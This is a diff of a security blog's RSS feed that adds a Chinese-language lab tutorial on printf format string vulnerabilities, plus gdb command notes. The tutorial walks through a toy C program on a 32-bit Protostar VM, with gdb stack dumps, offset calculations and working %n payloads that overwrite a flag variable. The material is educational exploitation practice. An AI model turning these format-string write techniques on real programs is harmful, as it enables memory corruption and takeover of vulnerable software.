@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 27 Jun 2016 15:13:16 +0800</pubDate>
-    <lastBuildDate>Mon, 27 Jun 2016 15:13:16 +0800</lastBuildDate>
+    <pubDate>Tue, 28 Jun 2016 10:34:55 +0800</pubDate>
+    <lastBuildDate>Tue, 28 Jun 2016 10:34:55 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
     
       <item>
@@ -34,13 +34,7 @@
 
 &lt;p&gt;4&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$n&quot;)&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;AAAA%3\$n&quot;):将4(4个A)写入第三个栈里的值指向的内存空间,也即将第三个栈里的内容看作一个地址，要将该地址处的内容写成4
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;5&amp;gt;printf(“\x88\xf0\xff\xbf%10x%10x%10x%1966x%n”)&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;\x88\xf0\xff\xbf%10x%10x%10x%1966x%n&quot;):在0xbffff088的内存位置处写入2000(4+10+10+10+1966)
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;AAAA%3\$n&quot;):将4(4个A)写入第三个栈里的值指向的内存空间,也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -54,7 +48,9 @@ http://drops.wooyun.org/papers/9426
 
 &lt;h4 id=&quot;c&quot;&gt;2&amp;gt;c代码&lt;/h4&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;假设文件名为md.c
+------------md.c----------------
+#include &amp;lt;stdio.h&amp;gt;
 int main(void)
 { 
     int flag = 0;
@@ -70,13 +66,198 @@ int main(void)
 
     return 0;
 }
+-------------end----------------
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
 &lt;h4 id=&quot;section&quot;&gt;栈空间&lt;/h4&gt;
-&lt;p&gt;printf(“%x”,0x12345678),addr1=0x12345678,[esp+4]=0x12345678,
-从addr3处的格式存放处开始同时与printf的第一个参数%x的下面第一个栈单元内容匹配(这个内容被当作printf的第二个参数,虽然printf在此处只有一个参数),由于addr3处的格式存放处只有%x,所以形如printf(“%x”,something)的函数将
-printf(“%x”,0x41424344)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.cplusplus.com/reference/cstdio/printf/&quot;&gt;printf函数&lt;/a&gt;&lt;br /&gt;
+int printf ( const char * format, …  )&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨
+
+一般在栈空间里,形如&quot;%8xaaa%8d%n&quot;的字符串参数会存放在某个地方,而在栈中printf的第一个参数char *format一般是这个字符串(&quot;%8xaaa%8d%n&quot;)的地址,这个栈单元下面(高地址)的栈单元中存放的值是被cpu当作的后续参数,eg:
+
+printf(&quot;%8xaaa%8d%n&quot;)在栈中的数据如下:
+    printf_ebp(printf函数帧中的第一句push的ebp)
+    printf_retn(printf函数的返回地址)
+    addr_of_&quot;%8xaaa%8d%n&quot;(栈中第一个参数)
+    0x11111111(将成为栈中第二个参数)
+    0x22222222(将成为栈中第三个参数)
+    0x33333333(将成为栈中第三个参数)
+    ...(将成为栈中第四个参数)
+    ...(...)
+
+上面的printf调用后将产生这样的效果:
+    1.在屏幕上打印出:11111111aaa572662306(其中十六进制0x22222222对应十进制572662306),也即从printf的第二个参数开始打印或写入到对应地址
+    2.向地址为0x33333333的内存中写入19(8+3+8=19)
+
+后来发现这是windows中的情况,kalix64中栈中第一个参数的位置存放的不再是字符串&quot;%8xaaa%8d%n&quot;地址,而是字符串本身
+
+上面的2中的c代码对应的栈中分配的情况如下图format所示:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;图format
+&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/format.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现&quot;写&quot;
+
+因此,这个实验更适合在linux下进行,且kalix64中的情况与http://drops.wooyun.org/papers/9426中的情况不一样,将md.c复制到protostar(32位)系统中进行实验
+
+scp /root/桌面/md.c user@192.168.3.221:/tmp
+pass:user
+cd /tmp
+gcc -g -o md md.c
+gdb md
+disas /m main
+------output:-------
+8           printf(a);
+0x08048482 &amp;lt;main+46&amp;gt;:   lea    0x14(%esp),%eax
+0x08048486 &amp;lt;main+50&amp;gt;:   mov    %eax,(%esp)
+0x08048489 &amp;lt;main+53&amp;gt;:   call   0x8048364 &amp;lt;printf@plt&amp;gt;
+---------end--------
+b*main+53
+r
+input:AAAA%x.%x.%x
+x/20x $esp
+-----output:------
+0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
+0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
+0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
+0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
+0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
+------end---------
+根据上面windows下od跟踪绘出的图容易知道,0xbffff6e0处存放的为字符串&quot;AAAA%x.%x.%x&quot;的内存地址,也即0xbffff6e0处存放的为printf的第一个参数,0xbffff6e4为第二个参数,以此下推
+
+按照上面图format的理解易知程序运行完后将在屏幕上打印出:AAAAbffff6f4.080481dc.bffff778(从printf的第二个参数开始打印)
+
+如果scanf输入的是:AAAA%x.%x.%x.%x.%x,那么最后一个输出的地址将是41414141,因为printf的第六个参数是41414141,从第二个参数到第六个参数共5个栈单元大小
+
+再次分析此linux系统(protostar)中的变量在栈中存放的具体情况,如下
+disas main
+--------output:--------
+   │0x8048454 &amp;lt;main&amp;gt;                push   %ebp                                                                                                                                                                   │
+   │0x8048455 &amp;lt;main+1&amp;gt;              mov    %esp,%ebp                                                                                                                                                              │
+   │0x8048457 &amp;lt;main+3&amp;gt;              and    $0xfffffff0,%esp                                                                                                                                                       │
+   │0x804845a &amp;lt;main+6&amp;gt;              add    $0xffffff80,%esp                                                                                                                                                       │
+   │0x804845d &amp;lt;main+9&amp;gt;              movl   $0x0,0x78(%esp)                                                                                                                                                        │
+   │0x8048465 &amp;lt;main+17&amp;gt;             lea    0x78(%esp),%eax                                                                                                                                                        │
+   │0x8048469 &amp;lt;main+21&amp;gt;             mov    %eax,0x7c(%esp)                                                                                                                                                        │
+   │0x804846d &amp;lt;main+25&amp;gt;             mov    $0x8048570,%eax                                                                                                                                                        │
+   │0x8048472 &amp;lt;main+30&amp;gt;             lea    0x14(%esp),%edx                                                                                                                                                        │
+   │0x8048476 &amp;lt;main+34&amp;gt;             mov    %edx,0x4(%esp)                                                                                                                                                         │
+   │0x804847a &amp;lt;main+38&amp;gt;             mov    %eax,(%esp)                                                                                                                                                            │
+   │0x804847d &amp;lt;main+41&amp;gt;             call   0x8048374 &amp;lt;__isoc99_scanf@plt&amp;gt;                                                                                                                                         │
+   │0x8048482 &amp;lt;main+46&amp;gt;             lea    0x14(%esp),%eax                                                                                                                                                        │
+   │0x8048486 &amp;lt;main+50&amp;gt;             mov    %eax,(%esp)                                                                                                                                                            │
+B+&amp;gt;│0x8048489 &amp;lt;main+53&amp;gt;             call   0x8048364 &amp;lt;printf@plt&amp;gt; 
+-----------end---------
+main+9处为将flag(flag为0)存放到esp+0x78里面,也即esp+0x78处存放flag
+main+21处为将esp+0x78的值(flag所在的地址)放入到esp+0x7c中,也即flag+7c存放flag的地址
+形如:
+
+        --------
+addr1      0         addr1=esp+0x78,flag被赋值为0
+        --------
+         addr1       esp+0x7c处存放p,p被赋值为flag的地址
+        --------
+
+flag和p在栈中存放的位置情况与windows中的实验完全相反,linux中是flag存放在p的上面,而win7x64中是flag存放在p的下面
+
+在main+21处下断,用来查看esp+0x78的值,也即addr1的值,然后addr1+4即为p存放的地址,算出p存放的地址与printf第二个参数的地址相差多少,就可以知道如何安排format(%n的合适安排)来达到改变p指向的内容的值的目的,也即将一个值写入[p],相当于intel风格汇编语句mov [p],something
+
+q
+gdb md
+disas main
+-------------output:--------------
+0x08048454 &amp;lt;main+0&amp;gt;:    push   %ebp
+0x08048455 &amp;lt;main+1&amp;gt;:    mov    %esp,%ebp
+0x08048457 &amp;lt;main+3&amp;gt;:    and    $0xfffffff0,%esp
+0x0804845a &amp;lt;main+6&amp;gt;:    add    $0xffffff80,%esp
+0x0804845d &amp;lt;main+9&amp;gt;:    movl   $0x0,0x78(%esp)
+0x08048465 &amp;lt;main+17&amp;gt;:   lea    0x78(%esp),%eax
+0x08048469 &amp;lt;main+21&amp;gt;:   mov    %eax,0x7c(%esp)
+---------------end----------------
+b*main+21
+r
+p/x $eax
+-----output:-------
+$3 = 0xbffff758,也即0xbffff758处存放的为flag,addr1=0xbfff758
+-------end---------
+disas main
+-------------output:----------------
+0x0804847d &amp;lt;main+41&amp;gt;:   call   0x8048374 &amp;lt;__isoc99_scanf@plt&amp;gt;
+0x08048482 &amp;lt;main+46&amp;gt;:   lea    0x14(%esp),%eax
+0x08048486 &amp;lt;main+50&amp;gt;:   mov    %eax,(%esp)
+0x08048489 &amp;lt;main+53&amp;gt;:   call   0x8048364 &amp;lt;printf@plt&amp;gt;
+---------------end------------------
+b*main+53
+c
+input:AAAA%x.%x.%x
+x/40x $esp
+------------output:-----------------
+0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
+0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
+0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
+0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
+0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
+0xbffff730:     0xb7ff1040      0x08049668      0xbffff768      0x080484d9
+0xbffff740:     0xb7fd8304      0xb7fd7ff4      0x080484c0      0xbffff768
+0xbffff750:     0xb7ec6365      0xb7ff1040      0x00000000      0xbffff758
+0xbffff760:     0x080484c0      0x00000000      0xbffff7e8      0xb7eadc76
+0xbffff770:     0x00000001      0xbffff814      0xbffff81c      0xb7fe1848
+---------------end------------------
+同样可以看到0xbffff758处存放的0即为flag的值,而0xbfff75c处存放的为p,要实现将0xbffff75c处的0xbffff758指向的内容修改为2000,也即要实现0xbffff75c处,[0xbffff758]=2000
+
+0xbffff75c与printf的第二个参数的地址0xbffff6e4相差0xbffff75c-0xbffff6e4=0x78=30个栈单元大小,也即flag为printf的第31个参数,p为printf的第32个参数
+
+所以要将第32个参数指向的内容修改为2000,这样就可以实现将第31个参数修改为2000
+
+构造&quot;%x&quot;*30+%n,其中前面30个%x中要输出2000个长度,可以通过修改宽度输出大小实现,eg.%1768x+&quot;%x&quot;*29+%n(1768+29*8=2000)
+
+第六个参数为开始存放scanf由终端输入的格式化字符串,第32个参数的数据为重要的不能被scanf由终端输入覆盖的位置,所以输入最多可以输入第6到第31个参数所占的空间大小,共32-6+1=27个栈单元大小=27*4=108个字节
+
+如果由scanf从终端输入超过108个字节的格式化字符串,第109到112个字节将覆盖printf的第32个参数,这样printf执行完以后会将2000写入到109-112个字节被覆盖的值的地址空间中,所以如果输入超过108个字节也可以,但是必须保证输入的第109-112个字节为printf第32个参数原本的值,如果直接将printf第31个参数覆盖成2000,会在printf执行完以后被%n的作用改写成其他值,所以直接在printf的第31个参数位置输入2000是不行的
+
+最好的办法是输入长度不超过108个字节,如
+%1768x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n
+
+但是发现这样不会打印出good,gdb尝试打印发现是在printf打印的时候,如果%x对应的要打印的最高位为0,将被省略去这个&quot;0&quot;,所以改成下面的形式,强制8位对应每个%x
+
+%1768x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n(93个字节&amp;lt;108个字节)
+成功打印出good,实现了将flag修改为2000,这样在aslr开启的时候同样有效,因为这里用的是相对偏移
+
+在aslr没有开启时,为了进一步缩短scanf由终端输入的格式化字符串长度的大小(小于108即可),达到精确打击,直接改写printf的第32个参数指向的内存空间的值(也即实现修改flag),可以这样做:
+
+在scanf由终端输入的格式化字符串的开头写上printf的第32个参数的值,也即p的值,也即flag存放的地址
+scanf由终端输入:&quot;0xbffff758&quot;(对应printf第6个参数)+%8x(读第2个参数)+%8x(读第3个参数)+%8x(读第4个参数)+%1972x(读第5个参数)+%n(写进第6个参数指向的内存空间)
+也即&#39;\x58\xf7\xff\xbf&#39;%8x%8x%8x%1972x%n
+其中4+8*3+1972=2000
+但是0xbffff758是gdb调试时候的第32个参数的值,与md单独运行时并不相同,需要找出md直接运行时的printf的第32个参数的值替换即可
+
+scanf由终端输入%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAA%x(31个%x)
+
+最后第31个AA%x处对应输出为:AAbffff788,也即实际运行时printf的第32个参数为0xbffff788
+
+也可以通过http://drops.wooyun.org/papers/9426中查看printf第2个参数的值+(第32个参数与第2个参数相减的差)的方法来计算出第32个参数的大小
+
+构造:&#39;\x88\xf7\xff\xbf&#39;%8x%8x%8x%1972x%n
+python -c &quot;print &#39;\x88\xf7\xff\xbf&#39;+&#39;%8x%8x%8x%1972x%n&#39;&quot; | ./md
+成功修改了flag的值为2000,打印出了good!
+
+或者更短一些，利用%5\$n(直接参数访问)直接写入到printf第六个参数中
+也即：
+&#39;\x88\xf7\xff\xbf&#39;%1996x%5\$n
+
+python -c &quot;print &#39;\x88\xf7\xff\xbf&#39;+&#39;%1996x%5\$n&#39;&quot; | ./md
+成功修改了flag的值为2000,打印出了good!
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
 </description>
         <pubDate>Sun, 26 Jun 2016 00:00:00 +0800</pubDate>
         <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</link>
@@ -1877,7 +2058,9 @@ push esp+ret
    b 15
    info b(info break)
    info registers       #show registers
-   r(run)
+   r(run)               #第一次运行或重新开始运行程序
+   start                #开始运行程序
+   continue             #继续运行
    disas /m
                 /r      #show hex(显示汇编指令对应十六进制值)
                 /m      #show source if available(如果有源码,显示对应行源码)
@@ -1890,6 +2073,13 @@ push esp+ret
    bt(backtrace)        #查看所有栈帧信息
    f num(frame num)     #选择并打印第num个栈帧信息
    info f(info frame)   #查看当前栈帧信息
+
+   layout：用于分割窗口，可以一边查看代码，一边测试：
+   layout src：显示源代码窗口
+   layout asm：显示反汇编窗口
+   layout regs：显示源代码/反汇编和CPU寄存器窗口
+   layout split：显示源代码和反汇编窗口
+   Ctrl + L：刷新窗口
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
